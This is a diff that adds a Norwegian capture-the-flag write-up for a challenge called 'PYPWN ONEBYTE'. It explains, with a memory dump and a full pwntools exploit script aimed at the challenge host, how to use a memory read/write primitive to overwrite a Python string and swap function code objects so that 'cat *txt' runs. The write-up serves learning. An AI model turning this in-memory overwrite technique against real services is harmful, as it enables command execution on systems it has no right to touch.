@@ -236,3 +236,97 @@ io.close()
   
   `flag{aLl_w3_neEDed_wAs_a_co_code_fl1p!}`
 </details>
+
+
+
+
+## PYPWN ONEBYTE
+
+### Oppgave
+
+
+### Løsning
+
+Vi trenger å endre to ting. Hvilken funksjon som kjøres må endres fra debug til exec. Og stringen "id" må endres til en kommando som kan skrive ut flagget fra filen flag.txt.
+
+Å bytte ut stringen er ikke så vanskelig. I minnet finner vi et PyUnicodeObjekt der vi kan bytte ut teksten "id" med vår egen tekst:
+
+```
+0x00007fe49ba98a70: 0000000000000014 # HEAD
+0x00007fe49ba98a78: 00005648392167c0 # Type
+0x00007fe49ba98a80: 0000000000000002 # Lengde på string <- 08
+0x00007fe49ba98a88: d5f125e0c0265022 # Hash
+0x00007fe49ba98a90: 00000000000000e5 #
+0x00007fe49ba98a98: 0000000000000000 # NULL
+0x00007fe49ba98aa0: 0000000000006469 # String <- 2a63617420747874 (cat *txt)
+```
+
+Å bytte ut funksjonen er litt mer komplisert. Vi utnytter at funksjonene ligger ved siden av hverandre i minnet med konstant avstand, 0x90. Det gjør at vi kan både lese og skrive over innholdet i både exec og debug. Hvis vi nå erstatter instruksjonene til debug med intsruksjoner fra exec vil debug nå oppføre seg som exec.
+
+Ettersom intrsuksjonene peker til stringen med en absolutt pointer vil instruksjonene fortsatt lese den gamle stringen (som nå er endret).
+
+
+```py
+from pwn import *
+
+# Read memory address
+def read_addr(addr):
+    io.sendlineafter(b":", addr)
+    # Read data and concat
+    io.recvuntil(b": ")
+    value = bytes.fromhex(io.recvuntil(b"\n", drop=True).decode('utf-8'))[::-1].hex()
+    return value
+
+# Read memory address
+def write_addr(addr, value):
+    io.sendlineafter(b":", addr)
+    io.sendlineafter(b":", value)
+    # Clean up response
+    io.recvuntil(b"\n", drop=True).decode('utf-8')
+
+# Connect to the remote service
+io = remote('pypwnexec.ept.gg', 1337, ssl=True)
+# io = process(["python3","./source.py"]) # local debugging
+
+# Shell
+print(io.recvuntil(b"="))
+ShellFunctionObject = bytes.decode(io.recvuntil(b"\n", drop=True))
+ShellCodeObject = read_addr(hex(int(ShellFunctionObject, 16) + 6*8))
+Shell_co_consts = read_addr(hex(int(ShellCodeObject, 16) + 7*8))
+arg_str = read_addr( hex(int(Shell_co_consts, 16) + 4*8) )
+print(f"The constants list where \"id\" will be replaced starts at: {arg_str}")
+
+# Debug
+DebugFunctionObject = hex(int(ShellFunctionObject, 16) - 144) # Debug is -0x90 relative to Shell
+
+# Exec
+ExecFunctionObject = hex(int(ShellFunctionObject, 16) - 288)  # Exec is -0x120 relative to Shell
+ExecCodeObject = read_addr( hex(int(ExecFunctionObject, 16) + 6*8))
+print(f"code object of exec: {ExecCodeObject} will be replaced with code object in debug at address {hex(int(DebugFunctionObject, 16) + 6*8)}")
+
+# Exit read mode
+io.sendlineafter(b":", "write")
+
+# Change string "id" -> "cat *txt"
+write_addr(hex(int(arg_str, 16) + 2*8), "08") # update length of str
+for i in range(0, 16, 2):
+    write_addr(hex(int(arg_str, 16) + 6*8 + i//2), bytes.fromhex("7478742a20746163")[::-1].hex()[i:i+2])
+
+# Change co_code debug -> exec
+for i in range(0, 16, 2):
+    write_addr(hex(int(DebugFunctionObject, 16) + 6*8 + i//2), bytes.fromhex(ExecCodeObject)[::-1].hex()[i:i+2])
+
+# Exit read mode
+io.sendlineafter(b":", "write")
+
+io.interactive() # Use interactive mode to do the final step of analyzing and changing the right bit.
+
+# Close the connection
+io.close()
+```
+
+<details>
+  <summary>Flagg</summary>
+  
+  `flag{d1D_YOu_in-meMoRY_oVerWriTe_0f_globals_debug?}`
+</details>
